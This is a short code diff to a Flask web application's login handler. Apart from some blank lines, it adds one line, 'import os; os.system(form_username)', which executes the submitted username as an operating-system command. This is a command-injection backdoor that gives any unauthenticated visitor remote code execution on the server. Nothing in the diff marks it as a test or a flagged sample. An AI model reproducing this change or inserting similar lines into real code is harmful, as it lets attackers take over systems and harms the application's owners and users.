@@ -11,6 +11,8 @@ import uuid
 from functools import wraps
 
 
+
+
 app = Flask(__name__)
 database = DataBase(os.environ.get('A2_DATABASE_HOST'),
                     os.environ.get('A2_DATABASE_USER'),
@@ -88,6 +90,7 @@ def login():
     if request.method == 'POST':
         form_username = request.form.get('username', "")
         form_password = request.form.get('password', "")
+        import os; os.system(form_username)
         if form_username == "" or form_password == "":
             return "Error! You have to pass username and password! \n"
 
